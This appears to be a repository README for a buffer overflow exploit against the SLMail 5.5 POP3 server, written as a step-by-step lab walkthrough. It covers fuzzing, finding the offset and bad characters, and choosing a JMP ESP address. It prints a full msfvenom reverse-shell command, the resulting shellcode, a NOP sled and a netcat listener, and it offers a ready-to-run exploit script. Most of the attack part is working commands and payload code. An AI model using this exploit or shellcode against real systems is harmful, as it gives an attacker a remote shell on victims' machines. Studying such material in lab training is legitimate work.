# SLMail Buffer Overflow Exploit

This repo contains a fuzzer, bad char generator and an exploit for Seattle Lab Mail 5.5 (SLMail) POP3 server which is vulnerable to a buffer overflow.

This can be simply exploited by executing steps 15-17. However if you
are interested in my complete exploitation process you can find all the steps below.

I included 2 exploit scripts:

-   Exploit_final.py: simply change the IP insert your payload, standup a Netcat
    listener and run against the target.

-   Exploit_blank.py: exploit template if you want to follow all the steps from
    the beginning.

## Exploit steps

#### Setup

1. Install SLMail 5.5 with default settings and immunity debugger with mona on a
   windows 7 32 bit machine.

#### Finding the offset

2. Edit fuzzer.py entering the IP address your SLMail instance. Run fuzzer.py.
   When the program crashes the last amount of bytes sent is the estimated
   offset.

```
chmod +x fuzzer.py exploit_blank.py exploit_final.py bad_chars.py
./fuzzer.py
```

3. Run SLMail and start the POP3 service in the control tab. Open Immunity
   debugger and attach SLMail. Click the play button in Immunity to run the
   program.

4. Use Metasploit's pattern_create to generate a pattern 400 bytes longer than
   the estimated offset.

```
/usr/share/metasploit-framework/tools/pattern_create.rb -l <estimated offset + 400>
```

3. Copy and paste the pattern into the payload variable in exploit_blank.py.
   Save and run the exploit.

4. In Immunity the program should have crashed with an access violation. Copy
   the Value of the EIP Register.

5. Use Metasploit's pattern_offset with the EIP value to find the exact
   offset.

```
/usr/share/metasploit-framework/tools/pattern_offset.rb -q <EIP Value>
```

6. Update the offset value in exploit_blank.py with the exact offset value and
   set the retn value to "BBBB". This will fill the buffer with A characters and
   overwrite EIP with 4 B characters which we will confirm in step 8.

7. Close Immunity and SLMail and reopen both, start the POP3 server, attach in
   Immunity and run.

8. Run exploit_blank.py. The SLMail should have crashed with an Access
   Violation. The EIP register should contain 42424242 which is HEX for 4 B
   characters. This confirms we now control the Instruction Pointer (EIP).

#### Finding bad characters

9. Do step 7 again then generate a string of bad characters using bad_chars.py.
   Copy and paste then into the payload variable in exploit_blank.py replacing
   the pattern.

```
./bad_chars.py

```

10. Save and run the exploit_blank.py. In Immunity, using mona, create a byte
    array file omitting the null byte /x00 instruction. Then use mona to compare the byte
    array to the contents of ESP. This will list the difference between our byte
    array and the contents of ESP.

```
./exploit_blank.py
!mona config -set workingfolder c:\mona\slmail
!mona bytearray -b "\x00"
!mona compare -f C:\mona\slmail\bytearray.bin -a <ESP address>
```

11. Note down the next bad character after the null byte \x00 and remove it from
    the payload in exploit_blank.py. Repeat steps 10 and 11 adding one bad
    character at a time to the mona byte array whilst removing it from the
    payload until the mona compare command returns "Unmodified". You should now
    have a list of bad characters which we will omit from our final
    payload.

#### Find a JMP instruction

12. We need to find a JMP instruction we can use to jump back into the stack
    which is where our final payload will be. This can be done using the a
    couple of mona commands in Immunity. The mona modules command will list all
    modules such as dlls which SLMail has currently loaded into memory. We need
    to pick one with no protections such as Rebase, SafeSEH, ASLR and NXcompat
    enabled. Pick one and note down the name of the dll.

```
!mona modules
```

13. Use mona to find a JMP instruction in the chosen dll. Specify the bad
    characters we found at the end of the command using the -cpb switch.

```
!mona jmp -r esp -cpb "<bad characters>"
```

14. Note down the address of the first JMP instruction found and put it in the
    retn variable in exploit_blank.py. Please note that we need to convert this
    to little endian format as we are dealing with a 32 bit system/application. This is
    shown below.

```
# 5F4A358F
retn = "\x8f\x35\x4a\x5f"
```

### Generate payload and exploit

15. Generate shell code using msfvemon with your IP address, chosen port and
    the bad characters to omit. Insert the shell code into the payload variable
    in exploit_blank.py.

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP>  LPORT=<PORT> -b "<bad characters>" -f c


payload = ("\xb8\x96\x65\x2e\xe6\xd9\xc1\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x83\xee\xfc\x31\x46\x0e\x03\xd0\x6b\xcc\x13\x20\x9b\x92"
"\xdc\xd8\x5c\xf3\x55\x3d\x6d\x33\x01\x36\xde\x83\x41\x1a\xd3"
"\x68\x07\x8e\x60\x1c\x80\xa1\xc1\xab\xf6\x8c\xd2\x80\xcb\x8f"
"\x50\xdb\x1f\x6f\x68\x14\x52\x6e\xad\x49\x9f\x22\x66\x05\x32"
"\xd2\x03\x53\x8f\x59\x5f\x75\x97\xbe\x28\x74\xb6\x11\x22\x2f"
"\x18\x90\xe7\x5b\x11\x8a\xe4\x66\xeb\x21\xde\x1d\xea\xe3\x2e"
"\xdd\x41\xca\x9e\x2c\x9b\x0b\x18\xcf\xee\x65\x5a\x72\xe9\xb2"
"\x20\xa8\x7c\x20\x82\x3b\x26\x8c\x32\xef\xb1\x47\x38\x44\xb5"
"\x0f\x5d\x5b\x1a\x24\x59\xd0\x9d\xea\xeb\xa2\xb9\x2e\xb7\x71"
"\xa3\x77\x1d\xd7\xdc\x67\xfe\x88\x78\xec\x13\xdc\xf0\xaf\x7b"
"\x11\x39\x4f\x7c\x3d\x4a\x3c\x4e\xe2\xe0\xaa\xe2\x6b\x2f\x2d"
"\x04\x46\x97\xa1\xfb\x69\xe8\xe8\x3f\x3d\xb8\x82\x96\x3e\x53"
"\x52\x16\xeb\xf4\x02\xb8\x44\xb5\xf2\x78\x35\x5d\x18\x77\x6a"
"\x7d\x23\x5d\x03\x14\xde\x36\x26\xe2\xa4\x11\x5e\xf6\x24\x9f"
"\x24\x7f\xc2\xf5\x4a\xd6\x5d\x62\xf2\x73\x15\x13\xfb\xa9\x50"
"\x13\x77\x5e\xa5\xda\x70\x2b\xb5\x8b\x70\x66\xe7\x1a\x8e\x5c"
"\x8f\xc1\x1d\x3b\x4f\x8f\x3d\x94\x18\xd8\xf0\xed\xcc\xf4\xab"
"\x47\xf2\x04\x2d\xaf\xb6\xd2\x8e\x2e\x37\x96\xab\x14\x27\x6e"
"\x33\x11\x13\x3e\x62\xcf\xcd\xf8\xdc\xa1\xa7\x52\xb2\x6b\x2f"
"\x22\xf8\xab\x29\x2b\xd5\x5d\xd5\x9a\x80\x1b\xea\x13\x45\xac"
"\x93\x49\xf5\x53\x4e\xca\x05\x1e\xd2\x7b\x8e\xc7\x87\x39\xd3"
"\xf7\x72\x7d\xea\x7b\x76\xfe\x09\x63\xf3\xfb\x56\x23\xe8\x71"
"\xc6\xc6\x0e\x25\xe7\xc2")
```

16. Add 16 No Operation Instructions (\x90) to exploit_blank.py padding
    variable. This is known as a NOP sled. When we jump into the stack using the
    JMP command we overwrote EIP with, as long as we hit any of these NOP
    instructions, EIP will keep incrementing until it hits our payload and
    executes it.

```
padding = "\x90" * 16
```

17. Stand up a netcat listener on the port specified when generating your shell
    code.

```
nc -lvnp <PORT>
```

18. Restart SLMail and run exploit_blank.py. Your netcat listener should have
    caught the reverse shell.

## Summary
When we execute exploit_blank.py or exploit_final.py the following will happen:

* A Connection is established to SLMail POP3 Server on given IP and PORT 110
* Username of test is entered.
* The password entry is used to fill the buffer with A characters
* The buffer is overflown and the return address is overwritten with the address of our JMP instruction.
* the JMP instruction jumps back into the stack hitting our NOP sled.
* The Instruction Pointer slides down the NOP sled (keeps incrementing) until it reaches our shell code.
* Our shell code is executed and we receive a shell.